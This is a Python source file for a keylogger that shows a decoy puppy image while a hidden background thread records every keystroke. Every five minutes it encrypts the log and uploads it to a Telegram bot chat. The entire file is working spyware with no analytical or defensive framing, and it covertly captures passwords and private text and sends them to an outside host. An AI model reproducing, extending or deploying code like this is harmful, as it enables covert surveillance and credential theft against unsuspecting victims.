import os
import threading
import base64
from cryptography.fernet import Fernet
import requests
import time
from PIL import Image
import pyxhook

# --- Configuration ---
LOG_FILE = "keylogs.txt"
ENCRYPTED_LOG_FILE = "keylogs.enc"
KEY_FILE = "encryption.key"
TELEGRAM_BOT_TOKEN = os.environ.get("BOT_TOKEN", "default_bot_token")
TELEGRAM_CHAT_ID = os.environ.get("YOUR_CHAT_ID", "default_chat_id")
IMAGE_FILE = "puppy.jpg"  # Replace with your image file

# --- Encryption Setup ---
def generate_key():
    if not os.path.exists(KEY_FILE):
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as keyfile:
            keyfile.write(key)

def load_key():
    try:
        with open(KEY_FILE, "rb") as keyfile:
            return keyfile.read()
    except FileNotFoundError:
        print("Encryption key not found! Generating a new key...")
        generate_key()
        return load_key()

def encrypt_file():
    key = load_key()
    fernet = Fernet(key)

    try:
        with open(LOG_FILE, "rb") as file:
            data = file.read()
        encrypted_data = fernet.encrypt(data)

        with open(ENCRYPTED_LOG_FILE, "wb") as enc_file:
            enc_file.write(encrypted_data)
    except Exception as e:
        print(f"Encryption failed: {e}")

def decrypt_file():
    try:
        key = load_key()
        fernet = Fernet(key)
        with open(ENCRYPTED_LOG_FILE, "rb") as enc_file:
            encrypted_data = enc_file.read()
        return fernet.decrypt(encrypted_data)
    except Exception as e:
        print(f"Decryption failed: {e}")
        return None

# --- Keystroke Logger ---
_keylogger_active = threading.Event()

def on_key_press(event):
    if not _keylogger_active.is_set():
        return
    try:
        with open(LOG_FILE, "a") as logfile:
            logfile.write(f"{event.Key}")
    except Exception as e:
        print(f"Error logging key: {e}")

def start_keylogger():
    global _keylogger_active
    _keylogger_active.set()

    hookman = pyxhook.HookManager()
    hookman.KeyDown = on_key_press
    hookman.HookKeyboard()
    try:
        hookman.start()
    except KeyboardInterrupt:
        hookman.cancel()

def stop_keylogger():
    global _keylogger_active
    _keylogger_active.clear()

# --- Communication with Telegram ---
def send_logs_to_telegram():
    encrypt_file()
    try:
        with open(ENCRYPTED_LOG_FILE, "rb") as enc_file:
            encrypted_logs = enc_file.read()

        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        files = {"document": ("keylogs.enc", encrypted_logs)}
        data = {"chat_id": TELEGRAM_CHAT_ID, "caption": "Encrypted Keylogs"}

        response = requests.post(url, files=files, data=data)
        response.raise_for_status()
        print("Logs sent successfully!")
    except Exception as e:
        print(f"Failed to send logs: {e}")

# --- Display Image ---
def display_image():
    try:
        img = Image.open(IMAGE_FILE)
        img.show()
    except Exception as e:
        print(f"Failed to display image: {e}")

# --- Background Process ---
def background_process():
    display_image()

    # Start keylogger in a separate thread
    keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
    keylogger_thread.start()

    last_sent = time.time()

    while True:
        if time.time() - last_sent >= 300:  # 5 minutes
            send_logs_to_telegram()
            last_sent = time.time()
        time.sleep(1)

if __name__ == "__main__":
    generate_key()  # Ensure encryption key exists
    background_process()
